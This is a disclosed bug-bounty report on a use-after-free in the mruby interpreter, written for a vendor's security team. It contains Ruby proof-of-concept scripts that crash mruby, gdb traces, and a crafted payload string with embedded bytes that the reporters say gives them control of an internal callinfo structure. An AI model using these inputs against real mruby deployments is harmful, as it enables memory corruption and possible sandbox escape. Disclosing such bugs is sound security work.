# Use-after-free leading to an invalid pointer dereference

## Report Details
- **Report ID**: 213261
- **URL**: https://hackerone.com/reports/213261
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-03-14T00:21:30.366Z
- **Disclosed**: 2017-04-02T13:29:48.105Z

## Reporter
- **Username**: dgaletic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
===

The following code demonstrates a crash:

    class A < def to_str
      ""[1, 2, 3]
      ensure --> {} rescue
      Struct.new.new.to_h
      end
    end

Discussion
==========
    
mruby crashes due to an invalid pointer dereference in vm.c:1692:

    1689│       L_RESCUE:
    1690│         if (ci->ridx == 0) goto L_STOP;
    1691│         proc = ci->proc;
    1692├>        irep = proc->body.irep;

(gdb) print ci->proc
$3 = (struct RProc *) 0x511

mruby-engine crashes similarly in class.h:50:

    50├>    return mrb_obj_ptr(v)->c;
    51│   }
    52│ }

(gdb) print mrb_obj_ptr(v)
$2 = (struct RObject *) 0x6

Valgrind reports many (3032 errors from 108 contexts) invalid reads and writes happening inside memory free'd by a realloc. We were able to exploit this to achieve control over the callinfo struct in mruby, as demonstrated here on `proc`:

    class A < def to_str
    a = "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEp\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fsAEtAEuAEvAEwAExX\xe5\xfc\xff\xff\x6f\x00\x001AE2AE3AE4AE5AE6AE7AE8AE\x90\xe0n\x00\x00\x00\x00\x00FCAFDAFEAFFA\x00\x00\x00\x00HAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFk" * 4
      ""[1, 2, 3]
      ensure --> {} rescue
      Struct.new.new.to_h
      end
    end
    
Program received signal SIGSEGV, Segmentation fault.
0x000000000041f164 in mrb_vm_exec (mrb=0x6af010, proc=0xf0f0f0f0f0f0f0f, pc=0x71dd18) at /home/<user>/repos/mruby/src/vm.c:1692
(gdb) print *ci
$3 = {mid = 1161915973, proc = 0xf0f0f0f0f0f0f0f, stackent = 0x4175454174454173, nregs = 1161918021, ridx = 2017804663, eidx = -203432, env = 0x4133454132454131, pc =0x3645413545413445, err = 0x4541384541374541, argc = 7266448, acc = 0, target_class = 0x4546414446414346}

We will continue working on this bug to see whether the same can be achieved in mruby-engine.

Thank you,
Dinko Galetic
Denis Kasak

## Attachments
No attachments
